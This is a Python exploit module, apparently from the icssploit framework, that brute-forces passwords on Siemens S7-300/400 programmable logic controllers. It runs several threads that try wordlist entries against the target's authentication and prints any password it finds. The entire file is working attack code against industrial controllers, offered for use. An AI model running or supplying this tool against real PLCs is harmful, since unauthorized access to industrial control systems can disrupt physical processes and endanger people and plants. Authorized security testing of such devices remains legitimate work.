
from icssploit.clients.s7_client import S7Client
from scapy.all import conf
import threading

from icssploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    boolify,
    multi,
    validators
)


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'S7 300/400 PLC Password Bruteforce',
        'description': 'Module performs bruteforce attack against S7 300/400 Device. '
                       'If valid password string is found, it is displayed to the user.',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'references': [
            '',
        ],
        'devices': [
            'Siemens S7-300 and S7-400 programmable logic controllers (PLCs)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(102, 'Target Port', validators=validators.integer)
    rack = exploits.Option(0, 'CPU rack number.', validators=validators.integer)
    slot = exploits.Option(2, 'CPU slot number.', validators=validators.integer)
    password = exploits.Option(wordlists.passwords, 'password string or file with community strings (file://)')
    threads = exploits.Option(3, 'Number of threads')
    verbose = exploits.Option(0, 'Verbose scapy output. 1: display, 0: hide', validators=validators.choice([0, 1]))
    stop_on_success = exploits.Option('yes', 'Stop on first valid community string')

    strings = []

    def run(self):
        conf.verb = int(self.verbose)
        self.strings = []
        self.attack()

    @multi
    def attack(self):
        # todo: check if service is up
        if self.password.startswith('file://'):
            s7_pass = open(self.password[7:], 'r')
        else:
            s7_pass = [self.password]

        collection = LockedIterator(s7_pass)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.strings):
            print_success("Credentials found!")
            headers = ("Target", "Port", "password")
            print_table(headers, *self.strings)
        else:
            print_error("Valid password not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbose)
        name = threading.current_thread().name

        print_status(name, 'thread is starting...', verbose=module_verbosity)
        s7_client = S7Client(name="Siemens PLC", ip=self.target, rack=self.rack, slot=self.slot)
        s7_client.connect()
        if not module_verbosity:
            s7_client.logger.setLevel(50)
        while running.is_set():
            try:
                string = data.next().strip()
                if len(string) > 8:
                    continue
                s7_client.check_privilege()
                if s7_client.protect_level == 1:
                    print_error("Target didn't set password.")
                    return
                s7_client.auth(string)
                if s7_client.authorized:
                    if boolify(self.stop_on_success):
                        running.clear()
                    print_success("Target: {}:{} {}: Valid password string found - String: '{}'".format(
                        self.target, self.port, name, string), verbose=module_verbosity)
                    self.strings.append((self.target, self.port, string))

                else:
                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(
                        self.target, self.port, name, string), verbose=module_verbosity)

            except StopIteration:
                break

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
